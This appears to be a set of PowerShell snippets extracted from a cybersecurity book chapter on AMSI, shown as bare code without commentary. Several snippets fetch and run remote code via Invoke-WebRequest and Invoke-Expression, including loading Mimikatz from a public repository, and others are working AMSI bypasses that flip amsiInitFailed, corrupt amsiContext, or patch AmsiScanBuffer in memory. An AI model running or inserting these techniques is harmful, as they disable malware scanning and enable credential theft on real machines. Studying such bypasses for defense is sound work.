["```\nfunction Invoke-MaliciousScript {\n    Write-Host \"Y0u g0t h4ck3d!\"\n}\nInvoke-MaliciousScript\n```", "```\nfunction Invoke-MaliciousScript {\n    $a = 4\n    $output = \"Y0\" + \"u g\" + \"0t h\" + $a + \"ck\" + ($a - 1) + \"d!\"\n    Write-Host $output\n}\nInvoke-MaliciousScript\n```", "```\nfunction Invoke-MaliciousScript {\n    $string = \"WQAwAHUAIABnADAAdAAgAGgANABjAGsAMwBkACEA\"\n    $output = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($string))\n    Write-Host $output\n}\nInvoke-MaliciousScript\n```", "```\nfunction Invoke-MaliciousScript {\n    $string = \"SyJnMnUiZjJ6JnF5IXYz\"\n    $key = 0x12\n    $bytes = [System.Convert]::FromBase64String($string)\n    $output = -join ($bytes | ForEach-Object { [char] ($_ -bxor $key)})\n    Write-Host $output\n}\nInvoke-MaliciousScript\n```", "```\nfunction Invoke-MaliciousScript {\n    $output = Invoke-WebRequest https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter12/AMSIExample5.txt\n    Invoke-Expression $output\n}\nInvoke-MaliciousScript\n```", "```\nNew-Module -Name Invoke-MimikatzModule -ScriptBlock {\n    Invoke-Expression (Invoke-WebRequest -UseBasicParsing \"https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1\")\n    Export-ModuleMember -function Invoke-Mimikatz\n} | Import-Module\n```", "```\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n```", "```\n$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)\n[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\",\"NonPublic,Static\").SetValue($null, [IntPtr]$mem)\n[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\",\"NonPublic,Static\").SetValue($null, $null);\n```", "```\nAdd-Type -TypeDefinition @\"\nusing System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\npublic static class Kernel32\n{\n    [DllImport(\"kernel32\", SetLastError=true, CharSet = CharSet.Ansi)]\n        public static extern IntPtr GetModuleHandle(\n            [MarshalAs(UnmanagedType.LPStr)]string lpFileName);\n    [DllImport(\"kernel32\", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]\n        public static extern IntPtr GetProcAddress(\n            IntPtr hModule,\n            string procName);\n    [DllImport(\"kernel32\", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]\n        public static extern IntPtr VirtualProtect(\n            IntPtr lpAddress,\n            UIntPtr dwSize,\n            uint flNewProtect,\n            out uint lpflOldProtect);\n}\n\"@\n```", "```\n$AmsiHandle = [Kernel32]::GetModuleHandle(\"amsi.dll\")\n```", "```\n$FuncName = \"AmsiScan\"\n$FuncName += \"Buffer\"\n```", "```\n$FuncPtr = [Kernel32]::GetProcAddress($AmsiHandle, $FuncName)\n```", "```\n$OldProtection = 0\n[Kernel32]::VirtualProtect($FuncPtr, [uint32]1, 0x40, [ref]$OldProtection)\n```", "```\n$Patch = [Byte[]] (0xC3)\n[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $FuncPtr, 1)\n```"]